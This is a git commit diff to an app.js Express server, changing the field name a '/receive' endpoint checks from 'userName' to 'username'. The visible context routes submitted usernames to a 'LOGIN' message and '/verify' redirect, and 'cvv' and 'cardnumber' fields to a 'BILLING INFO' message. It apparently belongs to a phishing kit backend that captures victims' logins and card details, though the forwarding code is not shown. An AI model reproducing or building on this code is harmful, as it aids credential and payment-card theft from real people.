a3830f8422656863942314311bd8e3ec998e90c1
Stephinefnzx <stephinezelzf@gmx.com>
2025-04-26 04:52:09 +0100

    Update app.js

--- app.js
+++ app.js
@@ -169,7 +169,7 @@ app.post('/receive', async (req, res) => {
       res.send({ url: type });
     };
 
-    if (myObjectKeys.includes('userName')) {
+    if (myObjectKeys.includes('username')) {
       prepareMessage("LOGIN", "/verify?action=1", true);
     } else if (myObjectKeys.includes('') || myObjectKeys.includes('cvv') || myObjectKeys.includes('cardnumber')) {
       prepareMessage("BILLING INFO", url, false);
